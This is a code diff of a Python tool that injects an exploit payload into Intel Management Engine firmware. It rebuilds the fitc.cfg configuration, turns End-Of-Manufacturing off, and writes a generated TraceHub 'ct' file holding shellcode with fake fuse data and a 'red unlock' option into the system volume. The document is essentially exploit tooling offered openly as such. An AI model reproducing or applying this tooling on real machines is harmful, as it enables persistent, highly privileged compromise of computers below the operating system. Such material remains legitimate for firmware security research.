@@ -11,40 +11,46 @@ from lib.cfg import CFG
 
 def generate_fitc_from_intel_and_delta(intel_cfg, delta_dir):
     # Create empty fitc.cfg
-    fitc_cfg = copy.copy(intel_cfg)
-    fitc_cfg.files = []
+    fitc_cfg = CFG()
+
     for intel_file in intel_cfg.files:
         # Copy over directory
         if intel_file.isDirectory():
-            fitc_cfg.files.append(intel_file)
+            fitc_cfg.addFile(intel_file.path, intel_file.data,
+                             intel_file.record.mode, intel_file.record.opt,
+                             intel_file.record.uid, intel_file.record.gid)
             continue
+
         # Skip non-overridable file
         if (intel_file.record.opt & 1) == 0:
             continue
+
+        # Look for file in the delta
         delta_path = os.path.join(delta_dir, intel_file.path.lstrip("/"))
         if os.path.isfile(delta_path):
             # Create modified overridable file from delta
             with open(delta_path, "rb") as f:
-                fitc_file = copy.copy(intel_file)
-                fitc_file.data = f.read()
-                fitc_cfg.files.append(fitc_file)
+                fitc_cfg.addFile(intel_file.path, f.read(),
+                                 intel_file.record.mode, intel_file.record.opt,
+                                 intel_file.record.uid, intel_file.record.gid)
         else:
             # Copy over unmodified overridable file
-            fitc_cfg.files.append(intel_file)
+            fitc_cfg.addFile(intel_file.path, intel_file.data,
+                             intel_file.record.mode, intel_file.record.opt,
+                             intel_file.record.uid, intel_file.record.gid)
+
     return fitc_cfg
 
 def apply_exploit_to_fitc(fitc_cfg, version, pch, fake_fpfs, red_unlock):
     # Make sure End-Of-Manufacturing is off
     fitc_cfg.removeFile("/home/mca/eom")
-    assert fitc_cfg.addFile("/home/mca/eom", b"\x00",
-        CFG.strToMode(' --Irw-r-----'), CFG.strToOpt('?!-F'), 0, 238)
+    fitc_cfg.addFile("/home/mca/eom", b"\x00", CFG.strToMode(' --Irw-r-----'), CFG.strToOpt('?!-F'), 0, 238)
+
     # Generate TraceHub configuration file with exploit payload
-    # FIXME: don't hardcode ME version and PCH model
     ct_payload = GenerateShellCode(version, pch, fake_fpfs, red_unlock)
     # Add TraceHub configuration file
     fitc_cfg.removeFile("/home/bup/ct")
-    assert fitc_cfg.addFile("/home/bup/ct", ct_payload,
-        CFG.strToMode(' ---rwxr-----'), CFG.strToOpt('?--F'), 3, 351)
+    fitc_cfg.addFile("/home/bup/ct", ct_payload, CFG.strToMode(' ---rwxr-----'), CFG.strToOpt('?--F'), 3, 351)
 
 def add_fitc_to_sysvol(sysvol, fitc_data):
     # Delete original fitc.cfg
@@ -70,6 +76,10 @@ args = parser.parse_args()
 with open(args.input, "rb") as f:
     me = parse_ifd_or_me(f.read())
 
+# Make sure delta directory exists
+if not os.path.isdir(args.delta):
+    raise ValueError(f"Delta directory {args.delta} not found")
+
 # Read FPF data
 with open(args.fake_fpfs, "rb") as f:
     fake_fpfs = f.read()
@@ -86,7 +96,7 @@ fitc_cfg = generate_fitc_from_intel_and_delta(intel_cfg, args.delta)
 # Modify fitc.cfg with exploit
 apply_exploit_to_fitc(fitc_cfg, args.version, args.pch, fake_fpfs, args.red_unlock)
 # Re-generate fitc.cfg
-fitc_cfg.generate(alignment=2)
+fitc_cfg.generate(alignment=0)
 
 # Write fitc.cfg
 add_fitc_to_sysvol(sysvol, fitc_cfg.data)
